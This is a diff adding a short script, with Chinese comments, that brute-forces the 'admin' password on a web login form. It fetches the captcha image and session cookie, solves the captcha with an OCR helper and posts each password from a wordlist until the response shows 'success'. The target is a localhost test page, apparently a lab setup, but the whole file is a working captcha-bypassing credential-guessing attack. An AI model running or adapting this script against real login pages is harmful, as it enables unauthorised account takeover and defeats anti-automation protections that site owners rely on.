@@ -1,0 +1,35 @@
+function GetPhpSession(header){
+	return GettextMiddle(header,"PHPSESSID=",";");
+}
+function GetCaptcha(path){
+	return GetPhpSession(DownLoadImg("http://127.0.0.1:8080/captcha.php",path));
+}
+function JudgeSuccess(username,password){
+	session = GetCaptcha("b.jpg");
+	captcha = ImgIdVC("b.jpg");
+	res = HttpPost("http://127.0.0.1:8080/testyzm.php","n=".username."&p=".password."&yzm=".captcha,"Cookie: PHPSESSID=".session);
+	if(StrFindStr(res[0],"wrong",0) != "-1"){
+		print("验证码错误:".captcha);
+		return 1;//验证码错误
+	}
+	if(StrFindStr(res[0],"error",0) != "-1"){
+		print("密码错误:"."用户名:".username."   密码:".password."   验证码:".captcha);
+		return 2;//密码错误
+	}
+	if(StrFindStr(res[0],"success",0) != "-1"){
+		print("爆破成功,用户名:".username."   密码:".password);
+		return 3;//账号密码正确
+	}
+}
+function main(args){
+	username = "admin";
+	passList = StrSplit(ReadFile("password.txt"),StrRN());
+	num = GetArrayNum(passList);
+	i = 0;
+	while(i<num){
+		res = JudgeSuccess(username,passList[ToInt(i)]);
+		if(res == 2){i = i+1;}
+		if(res == 3){break;}
+	}
+	print("爆破完毕");
+}
